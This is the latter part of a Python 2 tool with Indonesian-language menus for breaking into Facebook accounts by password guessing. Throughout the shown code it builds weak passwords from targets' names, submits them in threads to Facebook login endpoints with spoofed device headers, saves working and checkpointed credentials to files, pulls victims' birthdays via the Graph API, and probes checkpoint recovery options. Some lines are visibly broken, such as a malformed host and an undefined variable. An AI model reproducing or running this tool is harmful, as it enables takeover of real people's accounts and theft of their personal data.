                print b + ' [' + k + 'EZAA' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'JECK' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '5' + b + ' detik'
                print b + ' [' + k + 'EZAA' + b + ']' + k + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi', 'rahasia']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi', 'rahasia']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi', 'rahasia']
                    coeg.submit(crack, uid, pwx, 'https://m.facebook lite.com')

            exit(b + '\n\n [' + k + 'EZAA' + b + ']' + k + ' Crack Selesai Mau mu apa sekarang')
            time.slipe[1]
        else:
            exit(b + '\n [' + k + 'EZAA' + b + ']' + k + ' isi yang bener')
    else:
        menu()


def api(uid, pwx):
    global cp
    global loop
    global ok
    global token
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'

    sys.stdout.write('\r \x1b[0;36m[\x1b[0;33mJEECK\x1b[0;36m]\x1b[0;31m crack\x1b[0;33m %s/%s\x1b[0;37m OK:\x1b[0;32m-%s\x1b[0;37m - CP:\x1b[0;33m-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwx:
        pw = pw.lower()
        ses = requests.Session()
        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
        send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r \x1b[0;36m[\x1b[0;93mEZAA\x1b[0;36m]\x1b[0;96m %s|%s|%s\x1b[0;92m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
            break
        elif 'www.facebook.com' in send.json()['error_msg']:
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r \x1b[0;36m[\x1b[0;33mJECK\x1b[0;36m]\x1b[0;33m %s|%s|%s %s %s\x1b[0;36m' % (uid, pw, day, month, year)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tanggal, 'a').write('%s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r \x1b[0;36m[\x1b[0;33mNDRI\x1b[0;36m]\x1b[0;33m %s|%s\x1b[0;36m        ' % (uid, pw)
            cp.append('%s|%s' % (uid, pw))
            open('CP/%s.txt' % tanggal, 'a').write('%s|%s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def crack(uid, pwx, host, **kwargs):
    global loop
    global token
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'

    sys.stdout.write('\r \x1b[0;36m[\x1b[0;33mJEECK\x1b[0;36m]\x1b[0;31m crack\x1b[0;33m %s/%s\x1b[0;37m OK:\x1b[0;32m-%s\x1b[0;37m - CP:\x1b[0;33m-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    try:
        for pw in pwx:
            kwargs = {}
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
            p = ses.get(host + '/login/?next&ref=dbl&refid=8').text
            b = parser(p, 'html.parser')
            bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:
                        continue
                except:
                    pass

            kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
            gaaa = ses.post(host + '/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
                print '\r \x1b[0;36m[\x1b[0;33mEZAA\x1b[0;36m]\x1b[0;33m %s|%s|%s\x1b[0;36m' % (uid, pw, send.json()['access_token'])
                ok.append('%s|%s' % (uid, pw))
                open('OK/%s.txt' % tanggal, 'a').write('  ---> %s|%s\n' % (uid, pw))
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    token = open('login.txt', 'r').read()
                    with requests.Session() as (ses):
                        ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                        month, day, year = ttl.split('/')
                        month = bulan_ttl[month]
                        print '\r \x1b[0;36m[\x1b[0;33mNDRI\x1b[0;36m]\x1b[0;33m %s|%s|%s %s %s\x1b[0;36m' % (uid, pw, day, month, year)
                        cp.append('%s|%s' % (uid, pw))
                        open('CP/%s.txt' % tanggal, 'a').write('%s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                        break
                except (KeyError, IOError):
                    day = ' '
                    month = ' '
                    year = ' '
                except:
                    pass

                print '\r \x1b[0;36m[\x1b[0;33mJECK\x1b[0;36m]\x1b[0;33m %s|%s\x1b[0;36m        ' % (uid, pw)
                cp.append('%s|%s' % (uid, pw))
                open('CP/%s.txt' % tanggal, 'a').write('%s|%s\n' % (uid, pw))
                break
            else:
                continue

        loop += 1
    except Exception as e:
        if 'free.facebook.com' in host:
            return crack(uid, pwx, host)
        else:
            return crack(uid, pwx, 'https://free.facebook.com')


def setting_ua():
    print b + '\n [' + k + ' Pilih User-Agent Sesui Hp ' + b + ']\n'
    print b + ' [' + k + '1' + b + ']' + k + ' Xiaomi'
    print b + ' [' + k + '2' + b + ']' + k + ' Samsung'
    print b + ' [' + k + '3' + b + '] ' + k + 'Nokia'
    print b + ' [' + k + '4' + b + ']' + k + ' Asus'
    print b + ' [' + k + '5' + b + ']' + k + ' Huawei'
    print b + ' [' + k + '6' + b + ']' + k + ' Oppo'
    print b + ' [' + k + '7' + b + ']' + k + ' U-A random'
    print b + ' [' + k + '8' + b + ']' + k + ' User-Agent Manual'
    ua = raw_input(b + '\n [' + k + 'EZAA' + b + ']' + k + ' Pilih Bangke :' + b + ' ')
    if ua == '':
        menu()
    elif ua == '1':
        c_ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'GANTI' + b + '] ' + k + 'user-agent :' + pu + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + B + ' [' + k + 'GANTI' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    elif ua == '2':
        c_ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'GANTI' + b + '] ' + k + 'user-agent :' + p + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + b + ' [' + k + 'GANTI' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    elif ua == '3':
        c_ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'JECK' + b + '] ' + k + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + b + ' [' + k + 'JECK' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    elif ua == '4':
        c_ua = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'JECK' + b + '] ' + k + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + b + ' [' + k + 'JECK' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    elif ua == '5':
        c_ua = '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'JECK' + b + '] ' + k + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + b + ' [' + k + 'JECK' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    elif ua == '6':
        c_ua = 'Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'EZAA' + b + '] ' + k + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + b + ' [' + k + 'EZAA' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    elif ua == '7':
        c_ua = ('Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]',
                'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 5 Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + b + ' [' + k + 'NDRI' + b + '] ' + b + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + b + ' [' + k + 'JECK' + b + ']' + b + ' berhasil ganti user agent')
        menu()
    elif ua == '8':
        c_ua = raw_input('\n' + b + ' [' + k + 'EZAA' + b + ']' + k + ' user agent : ' + h + ' ')
        if c_ua == '':
            exit('\n [!] jangan kosong')
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n' + b + ' [' + k + 'EZAA' + b + ']' + k + ' berhasil ganti user agent')
        menu()
    else:
        menu()


def cek_opsi():
    print '\n ' + b + '[' + k + 'JEECK' + b + ']' + k + ' login via' + m + ' mbasic.facebook.com'
    print ' ' + b + '[' + k + 'NDRI' + b + ']' + k + ' masukan file (contoh: ' + h + 'CP/5-September.txt' + pu + ')'
    files = raw_input(' ' + b + '[' + k + 'EZAA' + b + ']' + k + ' nama file  :' + h + ' ')
    if files == '':
        menu()
    try:
        buka_baju = open(files, 'r').readlines()
    except IOError:
        exit('\n ! nama file %s tidak tersedia' % files)

    print b + ' [' + k + 'NDRI' + b + ']' + k + ' Njeenk Nih ToTalnya : ' + str(len(buka_baju))
    print b + ' [' + k + 'JECK' + b + ']' + k + ' Proses Ceek Njeenk Jangan Di Mode Pesawat.......'
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid = kontol.split('|')
        print '\n ' + b + '[' + k + 'EZAA' + b + ']' + k + ' cek akun : \x1b[0;92m' + kontol.replace(' + ', '')
        try:
            check_in(titid[0].replace(' + ', ''), titid[1])
        except requests.exceptions.ConnectionError:
            pass

    raw_input('\n ' + b + '[' + k + 'JECK' + b + ']' + k + ' klik enter untuk kembali ke menu....')
    menu()


def check_in(user, pasw):
    mb = 'https://x.facebook.com'
    ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        xnxx = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        print '\x1b[0;36m [\x1b[0;31mNDRI\x1b[0;36m]\x1b[0;33m Terlihat Ada \x1b[0;36m' + str(len(ngew)) + '\x1b[0;37m opsi '
        for opt in range(len(ngew)):
            print ' \x1b[0;36m[\x1b[0;33m' + str(opt + 1) + '\x1b[0;36m]\x1b[0;33m ' + ngew[opt]

    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print ' \x1b[0;36m[\x1b[0;33mEZAA\x1b[0;36m]\x1b[0;33m %s' % oh
    else:
        print '\x1b[0;36m [' + k + 'EZAA' + b + ']' + k + ' login gagal, silahkan cek kembali id dan password'


def main_coeg():
    os.system('git pull')
    os.system('touch login.txt')
    try:
        os.mkdir('CP')
    except:
        pass

    try:
        os.mkdir('OK')
    except:
        pass

    login()


if __name__ == '__main__':
    main_coeg()
